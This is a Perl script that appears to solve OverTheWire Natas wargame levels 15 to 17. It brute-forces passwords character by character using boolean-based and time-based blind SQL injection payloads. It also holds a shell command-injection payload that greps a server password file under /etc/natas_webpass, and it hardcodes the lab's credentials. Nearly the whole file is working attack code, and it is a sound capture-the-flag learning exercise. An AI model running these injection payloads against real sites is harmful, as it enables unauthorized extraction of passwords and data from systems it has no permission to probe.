#!/usr/bin/perl

#natas16" and SUBSTRING(password, 1, 1) = CHAR(65) and "1"="1

use HTTP::Request::Common;
use LWP::UserAgent;
use HTTP::Request;
use Time::HiRes qw /time/;

$auser = "natas15";
$apass = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
$auser = "natas16";
$apass = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh";
$auser = "natas17";
$apass = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw";

$url = "http://natas15.natas.labs.overthewire.org/index.php?debug=1";
$url = "http://natas16.natas.labs.overthewire.org/index.php";
$url = "http://natas17.natas.labs.overthewire.org/index.php";

$browser = LWP::UserAgent->new;

$pass = "";
$length = 0;
@chars = split("", "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
$delay = 10;

#$user.'" and length(password) = '.$i.' and "1"="1'
#=for length find
$query = "natas16\" and length(password) = %d and \"1\"=\"1";
$query = "\" UNION SELECT IF(length(password)=%d, sleep($delay), 1), 1 from users where username=\"natas18";
for (my $i=32; ; $i++)
{
	#print "Trying Length: ".$i."\n";
	$request = POST $url,
	Content => [
		username => sprintf($query, $i),
	];
	$request->authorization_basic($auser, $apass);
	$start = time;
	$response = $browser->request($request);
	$res = $response->content;
	$end = time;
=for natas15
	if(index($res, "doesn't") < 0)
	{
		#print $res;
		print "Length Found: ".$i."\n";
		$length = $i;
		last;
	}
=cut
	if(($end-$start)>$delay)
	{
		#print $res;
		print "Length Found: ".$i."\n";
		$length = $i;
		last;
	}
}
#=cut

#$length=32;
$query = 'natas16" and ASCII(SUBSTRING(password, %d, 1)) = ASCII("%c") and "1"="1';
$query = "?needle=\$(grep -E ^%s.* /etc/natas_webpass/natas17)hacker";
$query = "\" UNION SELECT IF(ASCII(SUBSTRING(password, %d, 1))=ASCII('%s'), sleep($delay), 1), 1 from users where username=\"natas18";
for (my $i=1; $i<=$length; $i++)
{
	foreach my $char(@chars)
	{
		#print "Trying ".$pass.$char."\n";
=for others
		$request = POST $url,
		Content => [
			username => sprintf($query, $i, $char),
		];
		$request = GET $url.sprintf($query, $pass.$char);
=cut
		$request = POST $url,
		Content => [
			username => sprintf($query, $i, $char),
		];
	
		$request->authorization_basic($auser, $apass);
		$start = time;
		$response = $browser->request($request);
		$res = $response->content;
		$end = time;
		#print "Query took: ".($end-$start)."\n";
		
=for natas15
		if(index($res, "doesn't") < 0)
		{
			#print $res;
			print "Found ".$char." at ".$i."\n";
			$pass .= $char;
			last;
		}
=for natas16
		if(index($res, "hacker") < 0)
		{
			#print $res;
			print "Found ".$char." at ".$i."\n";
			$pass .= $char;
			last;
		}
=cut
		if(($end-$start)>$delay)
		{
			#print $res;
			print "Found ".$char." at ".$i."\n";
			$pass .= $char;
			print $pass."\n";
			last;
		}
	}
}

print $pass."\n";
